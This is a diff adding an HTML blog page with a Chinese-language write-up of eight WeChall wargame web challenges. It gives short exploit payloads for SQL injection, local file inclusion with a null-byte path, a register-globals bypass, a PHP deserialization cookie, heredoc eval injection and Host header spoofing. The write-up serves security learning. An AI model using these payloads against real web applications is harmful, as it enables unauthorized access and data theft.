@@ -1,0 +1,711 @@
+<!doctype html>
+<html class="theme-next use-motion ">
+<head>
+    
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  <link href='//fonts.useso.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.4"/>
+
+
+    <meta name="description" content="水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会" />
+
+
+
+  <meta name="keywords" content="Wechall," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hc1m1" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/img/favicon.png?v=0.4.4" />
+
+
+<meta name="description">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WeChall Writeup">
+<meta property="og:url" content="http://lazysheep.cc/2015/08/07/0x06/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description">
+<meta property="og:image" content="http://lazysheep.cc/img/wechall.gif">
+<meta property="og:updated_time" content="2015-10-15T01:08:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WeChall Writeup">
+<meta name="twitter:description">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    sidebar: 'post'
+  };
+</script>
+
+    <title> WeChall Writeup // Hc1m1 </title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+<!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+<div class="container one-column page-post-detail">
+    <div class="headband"></div>
+    <header style="background: #f5f5f5;" id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+        <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Hc1m1</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-home"></i> <br />
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-categories"></i> <br />
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-about"></i> <br />
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            Tags
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+        </div>
+    </header>
+
+    <main id="main" class="main">
+        <div class="main-inner">
+            <div id="content" class="content">
+                
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              WeChall Writeup
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          Posted on
+          <time itemprop="dateCreated" datetime="2015-08-07T17:01:53+08:00" content="2015-08-07">
+            2015-08-07
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; In
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a href="/categories/H-blog/" itemprop="url" rel="index"><span itemprop="name">H-blog</span></a></span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/07/0x06/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/07/0x06/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="/img/wechall.gif" alt="Wechall"><br><a id="more"></a></p>
+<p>年轻人, 要多撸题, 少打炮..</p>
+<h2 id="0x00_No_Escape">0x00 No Escape</h2><p>看源码, 是sql注入.<br>payload: <code>index.php?vote_for=bill</code>=111%23`</p>
+<h2 id="0x01_Training:_PHP_LFI">0x01 Training: PHP LFI</h2><p>看源码, 文件包含漏洞.<br>payload: <code>index.php?file=../../solution.php%00</code></p>
+<h2 id="0x02_PHP_0817">0x02 PHP 0817</h2><p>这个比较傻..不多说.<br>payload: <code>index.php?which=solution</code></p>
+<h2 id="0x03_Training:_Register_Globals">0x03 Training: Register Globals</h2><p>全局变量的问题,,上次看到过,,不过现在的php已经没这漏洞了…(PHP还是那么老版本的活该..)<br>payload: <code>globals.php?login[]=admin</code></p>
+<h2 id="0x04_Are_you_serial">0x04 Are you serial</h2><p>这个有点屌…放代码吧..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoloader</span><span class="params">(<span class="variable">$classname</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./'</span>.str_replace(<span class="string">'.'</span>, <span class="string">''</span>, <span class="variable">$classname</span>).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cece</span><span class="params">(<span class="variable">$name</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">'cece'</span>);</span><br><span class="line"> <span class="comment">#spl_autoload_register('my_autoloader');</span></span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="string">'O:7:"phpinfo":0:&#123;&#125;'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这题的重点就在于 <code>spl_autoload_register</code> 这个函数.<br>解序列化后的如果有类, 而且当前程序中未定义该类, 则会自动把该类的名称传值到 (<code>sql_autoload_register(xxx)</code>) xxx函数中.<br>这题只要能运行 <code>SERIAL_Solution.php</code> 这个文件就算成功</p>
+<p>所以最后的payload是改cookie,<br><code>serial_user</code> 的值为 <code>O:15:&quot;SERIAL_Solution&quot;:0:{}</code></p>
+<h2 id="0x05_PHP_0819">0x05 PHP 0819</h2><p>第一次知道php还有这鬼东西….heredoc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;suibian</span><br><span class="line">正文</span><br><span class="line">正文</span><br><span class="line">suibian;</span></span><br><span class="line"><span class="comment">// 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;</span></span><br></pre></td></tr></table></figure>
+<p>这题的目的 <code>eval(&quot;\$spaceone=&#39;1337&#39;;&quot;);</code><br>但是引号都被过滤了…所以就可以用上面的那个代替引号…这里由于<code>eval</code>的原因, 结尾还要再来一个换行<br>payload: <code>index.php?eval=&lt;&lt;&lt;r%0a1337%0ar;%0a</code></p>
+<h2 id="0x06_HOST_me">0x06 HOST me</h2><p>这题一看就知道是去改host, 不过比较坑….改成 <code>host:localhost</code> 后会报错…纠结了好久..<br>网上查了以下才知道…需要….<br>payload:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只把要修改的行列出来</span></span><br><span class="line">GET <span class="string">http:</span><span class="comment">//www.wechall.net/challenge/space/host_me/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x07_PHP_0815">0x07 PHP 0815</h2><p>这题有点屌…这题的大概意思是它给你的代码存在sqli, 然后让你给出修补的方案, 要给出最短, 还不会影响原程序的方案…<br>表示并不会, 只看出了应该是修改 <code>in_array</code> 这里..<br>到网上搜索后才知道, 需要把 <code>$show</code> 转换为int 型, 有 <code>int()</code> 和 <code>intval()</code> 然而答案要最短,<br>最短的黑魔法…. —&gt; <code>$show - 0</code><br>提交 <code>in_array($show-0, $whitelist)</code> 竟然不对…坑爹的…最后提交 <code>-0</code> 过了..</p>
+<p>最后, 我在想,, 这脚本有sqli? 怎么日? ….然后试了一下…果然有…<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code.php?show=1%20union%20select%201%23</span></span><br><span class="line">Query: SELECT <span class="number">1</span> FROM `table` WHERE `id`=<span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br><span class="line">SHOWING NUMBER <span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<!--## 0x08 Stop us-->
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Wechall/" rel="tag">#Wechall</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/10/03/0x08/" rel="prev">2015XDCTF低分web题writeup</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/07/22/0x04/" rel="next">git小记</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+            </div>
+
+            
+
+            
+              <div class="comments" id="comments">
+                
+                  <div class="ds-thread" data-thread-key="2015/08/07/0x06/"
+                       data-title="WeChall Writeup" data-url="http://lazysheep.cc/2015/08/07/0x06/">
+                  </div>
+                
+              </div>
+            
+        </div>
+
+        
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar" style="overflow:scroll">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/img/default_avatar.jpg" alt="Hcamael" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Hcamael</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="icon-archives" style="color:white"></span><span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+            <span class="icon-categories" style="color:white"></span>
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">categories</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+            <span class="icon-tags" style="color:white"></span>
+              <span class="site-state-item-count">10</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate" style="text-align:center;" >
+              <i class="menu-item-icon icon-feed" ></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-github" ></span>
+                <a href="https://github.com/Hcamael" target="_blank">github</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-twitter" ></span>
+                <a href="https://twitter.com/2_wat1r" target="_blank">twitter</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-weibo" ></span>
+                <a href="http://weibo.com/hcamael" target="_blank">weibo</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-zhihu" ></span>
+                <a href="http://www.zhihu.com/people/hcamael" target="_blank">zhihu</a>
+              </span>
+              <br>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Links</p>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://hduisa.cn" target="_blank">HDUISA</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://lightless.me" target="_blank">lightless</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://homeway.me" target="_blank">夏日小草</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://www.edwardl.xyz" target="_blank">Edward_L</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://evilddog.space" target="_blank">evilddog</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://aklis.info" target="_blank">Aklis</a>
+              </span>
+              <br>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00_No_Escape"><span class="nav-number">1.</span> <span class="nav-text">0x00 No Escape</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01_Training:_PHP_LFI"><span class="nav-number">2.</span> <span class="nav-text">0x01 Training: PHP LFI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02_PHP_0817"><span class="nav-number">3.</span> <span class="nav-text">0x02 PHP 0817</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03_Training:_Register_Globals"><span class="nav-number">4.</span> <span class="nav-text">0x03 Training: Register Globals</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04_Are_you_serial"><span class="nav-number">5.</span> <span class="nav-text">0x04 Are you serial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05_PHP_0819"><span class="nav-number">6.</span> <span class="nav-text">0x05 PHP 0819</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06_HOST_me"><span class="nav-number">7.</span> <span class="nav-text">0x06 HOST me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07_PHP_0815"><span class="nav-number">8.</span> <span class="nav-text">0x07 PHP 0815</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            <div class="copyright" >
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2015</span>
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hcamael</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT
+  </a>
+</div>
+
+
+
+        </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+</div>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"hcamael"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.unstable.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+  	<script src="/js/ua-parser.min.js"></script>
+  	<script src="/js/hook-duoshuo.js"></script>
+  
+
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.4"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.4"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.4" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.4" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+<script type="text/javascript">
+    $(document).ready(function () {
+        if (CONFIG.sidebar === 'always') {
+            displaySidebar();
+        }
+    });
+</script>
+
+
+
+
+
+
+
+
+<!-- lazyload -->
+<script type="text/javascript" src="/js/lazyload.js"></script>
+<script type="text/javascript">
+    jQuery(function () {
+        jQuery("#posts img").lazyload({
+            placeholder: "/img/loading.gif",
+            effect: "fadeIn"
+        });
+    });
+</script>
+</body>
+</html>
